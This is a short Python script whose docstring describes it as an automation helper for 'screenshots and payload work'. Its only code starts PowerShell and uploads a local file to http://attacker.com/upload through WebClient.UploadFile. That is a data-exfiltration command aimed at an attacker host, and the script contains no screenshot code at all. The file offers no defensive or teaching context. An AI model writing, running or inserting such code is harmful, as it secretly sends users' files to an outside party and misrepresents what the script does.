"""Generated automation helper script for screenshots and payload work."""

import subprocess
subprocess.Popen(['powershell', '(New-Object System.Net.WebClient).UploadFile("http://attacker.com/upload", "C:\\path\\to\\file.txt")'])